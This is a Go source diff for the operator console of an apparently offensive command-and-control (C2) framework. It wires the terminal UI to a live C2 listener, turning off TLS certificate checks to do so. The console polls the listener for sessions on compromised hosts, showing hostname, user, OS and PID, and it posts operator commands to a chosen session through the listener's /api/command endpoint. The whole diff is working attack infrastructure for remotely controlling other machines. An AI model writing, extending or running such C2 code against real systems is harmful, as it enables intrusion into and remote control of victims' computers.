@@ -2,7 +2,12 @@
 package tui
 
 import (
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
 	"fmt"
+	"io"
+	"net/http"
 	"strings"
 	"time"
 
@@ -73,8 +78,21 @@ type PKITemplateInfo struct {
 	RequiresManagerApproval bool
 }
 
+// c2DataMsg carries live data fetched from the C2 listener.
+type c2DataMsg struct {
+	Sessions []Session
+	Listener *ListenerInfo
+	Err      error
+}
+
+// c2CmdResultMsg carries the result of posting a command to the C2.
+type c2CmdResultMsg struct {
+	Err error
+}
+
 // Model is the Bubbletea model for the operator console.
 type Model struct {
+	c2URL           string
 	view            View
 	sessions        []Session
 	selectedIdx     int
@@ -91,14 +109,131 @@ type Model struct {
 	lastRefresh     time.Time
 }
 
-// NewModel creates a new TUI model. Starts empty; populated by live C2 sessions.
-func NewModel() Model {
+// newC2Client returns an HTTP client with a short timeout and TLS verification disabled
+// for self-signed C2 certificates.
+func newC2Client() *http.Client {
+	return &http.Client{
+		Timeout: 2 * time.Second,
+		Transport: &http.Transport{
+			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, //nolint:gosec // C2 uses self-signed certs
+		},
+	}
+}
+
+// fetchC2Data returns a tea.Cmd that polls the C2 listener for sessions and health.
+func fetchC2Data(c2URL string) tea.Cmd {
+	return func() tea.Msg {
+		client := newC2Client()
+
+		// Fetch sessions
+		sessResp, err := client.Get(c2URL + "/api/sessions")
+		if err != nil {
+			return c2DataMsg{Err: fmt.Errorf("C2 unreachable: %w", err)}
+		}
+		defer sessResp.Body.Close()
+		sessBody, err := io.ReadAll(io.LimitReader(sessResp.Body, 1<<20))
+		if err != nil {
+			return c2DataMsg{Err: fmt.Errorf("read sessions: %w", err)}
+		}
+
+		type apiSession struct {
+			ID          string    `json:"id"`
+			Hostname    string    `json:"hostname"`
+			Username    string    `json:"username"`
+			OS          string    `json:"os"`
+			Arch        string    `json:"arch"`
+			PID         int       `json:"pid"`
+			RemoteAddr  string    `json:"remote_addr"`
+			FirstSeen   time.Time `json:"first_seen"`
+			LastCheckin time.Time `json:"last_checkin"`
+		}
+		var raw []apiSession
+		if err := json.Unmarshal(sessBody, &raw); err != nil {
+			return c2DataMsg{Err: fmt.Errorf("parse sessions: %w", err)}
+		}
+		sessions := make([]Session, len(raw))
+		for i, s := range raw {
+			sessions[i] = Session{
+				ID:         s.ID,
+				Hostname:   s.Hostname,
+				Username:   s.Username,
+				OS:         s.OS,
+				Arch:       s.Arch,
+				PID:        s.PID,
+				RemoteAddr: s.RemoteAddr,
+				FirstSeen:  s.FirstSeen,
+				LastCheckin: s.LastCheckin,
+			}
+		}
+
+		// Fetch health
+		healthResp, err := client.Get(c2URL + "/health")
+		if err != nil {
+			return c2DataMsg{Sessions: sessions, Err: fmt.Errorf("health check failed: %w", err)}
+		}
+		defer healthResp.Body.Close()
+		healthBody, err := io.ReadAll(io.LimitReader(healthResp.Body, 1<<16))
+		if err != nil {
+			return c2DataMsg{Sessions: sessions, Err: fmt.Errorf("read health: %w", err)}
+		}
+		var health struct {
+			Status   string `json:"status"`
+			Sessions int    `json:"sessions"`
+		}
+		if err := json.Unmarshal(healthBody, &health); err != nil {
+			return c2DataMsg{Sessions: sessions, Err: fmt.Errorf("parse health: %w", err)}
+		}
+
+		// Derive protocol from URL
+		proto := "http"
+		if strings.HasPrefix(c2URL, "https") {
+			proto = "https"
+		}
+		// Extract host:port for display
+		bind := strings.TrimPrefix(strings.TrimPrefix(c2URL, "https://"), "http://")
+
+		listener := &ListenerInfo{
+			BindAddress: bind,
+			Protocol:    proto,
+			Running:     health.Status == "ok",
+			Sessions:    health.Sessions,
+		}
+
+		return c2DataMsg{Sessions: sessions, Listener: listener}
+	}
+}
+
+// postC2Command sends a command to the C2 for the given session.
+func postC2Command(c2URL, sessionID, command string) tea.Cmd {
+	return func() tea.Msg {
+		client := newC2Client()
+		payload, _ := json.Marshal(map[string]string{
+			"session_id": sessionID,
+			"command":    command,
+		})
+		resp, err := client.Post(c2URL+"/api/command", "application/json", bytes.NewReader(payload))
+		if err != nil {
+			return c2CmdResultMsg{Err: fmt.Errorf("post command: %w", err)}
+		}
+		defer resp.Body.Close()
+		if resp.StatusCode != http.StatusOK {
+			body, _ := io.ReadAll(io.LimitReader(resp.Body, 1<<10))
+			return c2CmdResultMsg{Err: fmt.Errorf("command rejected (%d): %s", resp.StatusCode, string(body))}
+		}
+		return c2CmdResultMsg{}
+	}
+}
+
+// NewModel creates a new TUI model. Starts empty; populated by live C2 data.
+// Pass a non-empty c2URL to enable live polling from the C2 listener.
+func NewModel(c2URL string) Model {
 	ti := textinput.New()
 	ti.Placeholder = "Enter command..."
 	ti.CharLimit = 256
 	ti.Width = 60
 
 	return Model{
+		c2URL:       c2URL,
 		view:        ViewSessions,
 		sessions:    []Session{},
 		listeners:   []ListenerInfo{},
@@ -132,22 +267,55 @@ func (m Model) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
 
 	case tickMsg:
 		m.lastRefresh = time.Now()
+		if m.c2URL != "" {
+			return m, tea.Batch(tickCmd(), fetchC2Data(m.c2URL))
+		}
 		return m, tickCmd()
+
+	case c2DataMsg:
+		// Always update sessions if present (even on partial errors like health check failure)
+		if msg.Sessions != nil {
+			m.sessions = msg.Sessions
+		}
+		if msg.Listener != nil {
+			m.listeners = []ListenerInfo{*msg.Listener}
+		}
+		if msg.Err != nil {
+			m.statusMsg = fmt.Sprintf("C2: %s", msg.Err)
+		} else {
+			m.statusMsg = fmt.Sprintf("Connected — %d sessions", len(m.sessions))
+		}
+		return m, nil
+
+	case c2CmdResultMsg:
+		if msg.Err != nil {
+			m.statusMsg = fmt.Sprintf("Cmd error: %s", msg.Err)
+		}
+		return m, nil
 
 	case tea.KeyMsg:
 		if m.inputActive {
 			switch msg.String() {
 			case "enter":
-				cmd := m.cmdInput.Value()
-				if cmd != "" && m.selectedSession != "" {
+				cmdText := m.cmdInput.Value()
+				if cmdText != "" && m.selectedSession != "" {
 					m.commands = append(m.commands, CommandEntry{
 						ID:      fmt.Sprintf("cmd-%d", len(m.commands)+1),
-						Command: cmd,
+						Command: cmdText,
 						Queued:  time.Now(),
 					})
-					m.statusMsg = fmt.Sprintf("Queued: %s → %s", cmd, m.selectedSession[:8])
+					sid := m.selectedSession
+					if len(sid) > 8 {
+						sid = sid[:8]
+					}
+					m.statusMsg = fmt.Sprintf("Queued: %s → %s", cmdText, sid)
+					m.cmdInput.Reset()
+					if m.c2URL != "" {
+						return m, postC2Command(m.c2URL, m.selectedSession, cmdText)
+					}
+				} else {
+					m.cmdInput.Reset()
 				}
-				m.cmdInput.Reset()
 				return m, nil
 			case "esc":
 				m.inputActive = false
